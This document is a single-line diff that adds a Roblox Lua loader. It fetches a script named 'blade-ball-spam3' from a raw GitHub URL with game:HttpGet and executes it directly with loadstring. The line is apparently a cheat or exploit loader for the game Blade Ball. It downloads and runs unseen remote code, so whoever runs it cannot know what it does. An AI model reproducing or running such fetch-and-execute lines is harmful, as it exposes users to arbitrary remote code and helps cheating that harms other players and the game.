@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/blade-ball-spam3-yqydc38oo9qfp7.lua"))()
